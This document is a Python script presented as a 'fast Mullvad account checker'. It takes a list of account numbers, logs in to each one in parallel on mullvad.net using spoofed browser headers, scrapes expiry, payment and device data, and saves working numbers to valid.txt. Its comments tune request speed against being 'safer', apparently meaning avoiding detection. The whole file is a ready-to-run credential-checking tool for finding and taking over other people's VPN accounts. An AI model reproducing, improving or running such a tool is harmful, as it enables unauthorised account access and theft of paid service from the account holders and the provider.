"""
Fast Mullvad account checker
"""

import requests
import time
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from typing import Dict, Any


CODES_FILE = "codes.txt"
OPEN_FILE = "valid.txt"

MAX_WORKERS = 12          # Increase for more speed (try 8–20)
DELAY_BETWEEN_REQUESTS = 0.25  # seconds (lower = faster, higher = safer)
TIMEOUT = 12



HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
    "Accept-Language": "en-US,en;q=0.9",
    "Sec-Ch-Ua": '"Chromium";v="143", "Not A(Brand";v="24"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Linux"',
    "Origin": "https://mullvad.net",
    "Referer": "https://mullvad.net/en/account/login",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
}

write_lock = Lock()
print_lock = Lock()


def normalize_account(code: str) -> str:
    code = code.strip().replace(" ", "+").replace("-", "+")
    return "".join(c for c in code if c.isdigit() or c == "+")


def check_account(account_number: str) -> Dict[str, Any]:
    result = {
        "account": account_number,
        "valid": False,
        "expiry": None,
        "has_payments": None,
        "max_devices": None,
        "can_add_devices": None,
        "error": None,
    }

    session = requests.Session()
    session.headers.update(HEADERS)

    try:
        login_url = "https://mullvad.net/en/account/login"
        login_headers = {
            **HEADERS,
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Sveltekit-Action": "true",
        }
        data = {"account_number": account_number}

        resp = session.post(login_url, headers=login_headers, data=data, timeout=TIMEOUT)

        if resp.status_code != 200:
            result["error"] = f"Login HTTP {resp.status_code}"
            return result

        try:
            login_json = resp.json()
        except Exception:
            result["error"] = "Login not JSON"
            return result

        if login_json.get("type") != "redirect" or login_json.get("location") != "/en/account":
            result["error"] = "Login failed / invalid account"
            return result

        if "accessToken" not in session.cookies:
            result["error"] = "No accessToken"
            return result

        data_url = "https://mullvad.net/en/account/__data.json?x-sveltekit-invalidated=0110"
        data_headers = {
            **HEADERS,
            "Accept": "*/*",
            "Referer": "https://mullvad.net/en/account/login",
        }

        data_resp = session.get(data_url, headers=data_headers, timeout=TIMEOUT)

        if data_resp.status_code != 200:
            result["error"] = f"Data HTTP {data_resp.status_code}"
            return result

        try:
            payload = data_resp.json()
        except Exception:
            result["error"] = "Data not JSON"
            return result

        result["valid"] = True

        try:
            nodes = payload.get("nodes", [])
            for node in nodes:
                if node.get("type") == "data" and "data" in node:
                    data = node["data"]
                    if isinstance(data, list) and data:
                        mapping = data[0] if isinstance(data[0], dict) else None
                        if mapping and "me" in mapping:
                            me_idx = mapping["me"]
                            if isinstance(me_idx, int) and me_idx < len(data):
                                me = data[me_idx]
                                if isinstance(me, dict):
                                    result["expiry"] = me.get("expiry")
                                    result["has_payments"] = me.get("has_payments")
                                    result["max_devices"] = me.get("max_devices")
                                    result["can_add_devices"] = me.get("can_add_devices")
                                    break

                        def find_me(obj):
                            if isinstance(obj, dict):
                                if "expiry" in obj:
                                    return obj
                                for v in obj.values():
                                    found = find_me(v)
                                    if found:
                                        return found
                            elif isinstance(obj, list):
                                for item in obj:
                                    found = find_me(item)
                                    if found:
                                        return found
                            return None

                        me_obj = find_me(data)
                        if me_obj:
                            result["expiry"] = me_obj.get("expiry")
                            result["has_payments"] = me_obj.get("has_payments")
                            result["max_devices"] = me_obj.get("max_devices")
                            result["can_add_devices"] = me_obj.get("can_add_devices")
        except Exception as e:
            result["error"] = f"Parse error: {e}"

    except requests.RequestException as e:
        result["error"] = f"Request: {e}"
    except Exception as e:
        result["error"] = f"Unexpected: {e}"
    finally:
        session.close()

    return result


def main():
    codes_path = Path(CODES_FILE)
    if not codes_path.exists():
        print(f"[!] {CODES_FILE} not found")
        return

    codes = []
    with open(codes_path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                codes.append(normalize_account(line))

    if not codes:
        print("[!] No account numbers found")
        return

    total = len(codes)
    print(f"[*] Loaded {total} accounts")
    print(f"[*] Using {MAX_WORKERS} workers | delay ≈ {DELAY_BETWEEN_REQUESTS}s\n")

    valid_count = 0
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        future_to_code = {
            executor.submit(check_account, code): code for code in codes
        }

        for i, future in enumerate(as_completed(future_to_code), 1):
            result = future.result()
            code = result["account"]

            with print_lock:
                print(f"[{i}/{total}] {code} → ", end="", flush=True)

                if result["valid"]:
                    valid_count += 1
                    print("VALID")
                    print(f"    Expiry          : {result['expiry']}")
                    print(f"    Has payments    : {result['has_payments']}")
                    print(f"    Max devices     : {result['max_devices']}")
                    print(f"    Can add devices : {result['can_add_devices']}")

                    with write_lock:
                        with open(OPEN_FILE, "a", encoding="utf-8") as f:
                            f.write(f"{code}\n")
                else:
                    print("INVALID / ERROR")
                    if result["error"]:
                        print(f"    → {result['error']}")
                print()

            time.sleep(DELAY_BETWEEN_REQUESTS)

    elapsed = time.time() - start_time
    print(f"\n[*] Done in {elapsed:.1f}s")
    print(f"[*] {valid_count}/{total} valid account(s) saved to {OPEN_FILE}")


if __name__ == "__main__":
    main()
